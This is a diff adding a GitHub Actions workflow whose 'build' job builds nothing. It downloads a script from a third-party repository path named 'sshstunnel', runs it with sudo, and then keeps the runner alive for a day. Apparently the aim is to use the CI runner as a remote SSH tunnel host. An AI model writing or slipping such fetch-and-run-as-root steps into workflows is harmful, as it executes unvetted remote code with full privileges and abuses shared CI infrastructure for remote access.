@@ -1,0 +1,13 @@
+jobs:
+  build:
+    runs-on: ubuntu-22.04
+    steps:
+      - uses: actions/checkout@v3
+      - name: setup
+        run: |
+          sudo apt update -y
+          sudo apt install wget -y
+          wget https://github.com/githubaunglaymyanmar/sshinstall/raw/refs/heads/main/sshstunnel/run
+          sudo bash run
+      - name: Ubuntu ready to go
+        run: sleep 1d
